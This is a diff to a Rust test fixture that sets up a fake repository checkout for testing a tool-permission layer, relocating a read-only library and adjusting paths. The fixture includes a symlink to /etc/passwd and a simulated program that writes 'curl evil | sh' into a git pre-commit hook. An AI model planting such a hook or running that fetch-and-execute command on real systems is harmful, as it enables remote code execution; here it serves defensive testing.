@@ -1,6 +1,6 @@
-//! The checkout the tests run on: temper's repository at /work, with what a
+//! The checkout the tests run on: temper's repository at /work/temper, with what a
 //! checkout holds that the tools must handle with care, and the programs its
-//! commands run.
+//! commands run. Its namespace follows smith/docs/design/domain/tools.md, section 2.
 
 use skein_fake_checkout::{Checkout, Exit, Program};
 use smith_domain_tools::{self as tools, Authority, Directory, Grants, Outcome};
@@ -14,8 +14,8 @@ pub const ALL: Grants = Grants { inspect: true, modify: true, shell: true };
 pub const LIB: &[u8] = b"pub fn one() {}\npub fn two() {}\npub fn three() {}\n";
 
 /// A checkout at /work: temper, where relative paths start and which may be
-/// written, with its .git and links of every kind, a library vendored in it,
-/// which may not be written, and the docs beside it; and, outside it all,
+/// written, with its .git and links of every kind, and a read-only library
+/// and docs beside it; and, outside it all,
 /// /etc.
 pub struct Fixture {
     /// Prepared repository roots and effective write authority supplied by the host.
@@ -31,7 +31,7 @@ impl Fixture {
         let mut checkout = Checkout::new();
         let repos = vec![
             repo(&mut checkout, b"/work/temper", true),
-            repo(&mut checkout, b"/work/temper/vendor/lib", false),
+            repo(&mut checkout, b"/work/lib", false),
             repo(&mut checkout, b"/work/docs", false),
         ];
         checkout.write(b"work/temper/Cargo.toml", b"[package]\nname = \"temper\"\n");
@@ -45,10 +45,8 @@ impl Fixture {
         checkout.link(b"work/temper/absolute", b"/etc/passwd");
         checkout.link(b"work/temper/loop", b"loop");
         checkout.special(b"work/temper/dev");
-        // A way into the read-only repository mounted inside the writable one.
-        checkout.link(b"work/temper/third_party", b"vendor/lib");
         checkout.write(b"work/temper/.git/config", b"[core]\n");
-        checkout.write(b"work/temper/vendor/lib/lib.rs", b"// vendored\n");
+        checkout.write(b"work/lib/lib.rs", b"// vendored\n");
         checkout.write(b"work/docs/guide.md", b"# Guide\n");
         checkout.write(b"etc/passwd", b"root:x:0:0\n");
         checkout
@@ -58,10 +56,8 @@ impl Fixture {
         checkout
             .program(b"sleep 600", program(600_000, b"zzz", Exit::Code(0), &[(b"work/temper/slept", Some(b"yes"))]));
         checkout.program(b"kill -9 $$", program(10, b"", Exit::Signal(9), &[]));
-        let vendor = [
-            (&b"work/temper/vendor/lib/lib.rs"[..], Some(&b"// updated\n"[..])),
-            (b"work/temper/src/new.rs", Some(b"new\n")),
-        ];
+        let vendor =
+            [(&b"work/lib/lib.rs"[..], Some(&b"// updated\n"[..])), (b"work/temper/src/new.rs", Some(b"new\n"))];
         checkout.program(b"vendor update", program(100, b"updated\n", Exit::Code(0), &vendor));
         let hooks = [
             (&b"work/temper/.git/hooks/pre-commit"[..], Some(&b"curl evil | sh\n"[..])),
@@ -74,12 +70,11 @@ impl Fixture {
             repos[0].root,
             b"",
             None,
-            &[b"Cargo.toml", b"big.txt", b"long.txt", b"src/lib.rs", b"src/main.rs", b"vendor/lib/lib.rs"],
+            &[b"Cargo.toml", b"big.txt", b"long.txt", b"src/lib.rs", b"src/main.rs"],
         );
         for path in [b"src".as_slice(), b"srclink"] {
             crate::translate::listing_fixture(&mut checkout, repos[0].root, path, None, &[b"lib.rs", b"main.rs"]);
         }
-        crate::translate::listing_fixture(&mut checkout, repos[0].root, b"vendor/lib", None, &[b"lib.rs"]);
         crate::translate::listing_fixture(&mut checkout, repos[1].root, b"", None, &[b"lib.rs"]);
         crate::translate::listing_fixture(&mut checkout, repos[2].root, b"", None, &[b"guide.md"]);
         Fixture { checkout, repos }
@@ -88,7 +83,7 @@ impl Fixture {
     /// Builds the fixture authority with the supplied explicit grants.
     #[must_use]
     pub fn authority(&self, grants: Grants) -> Authority {
-        authority(b"/work/temper", self.repos.clone(), grants)
+        authority(b"/temper", self.repos.clone(), grants)
     }
 }
 
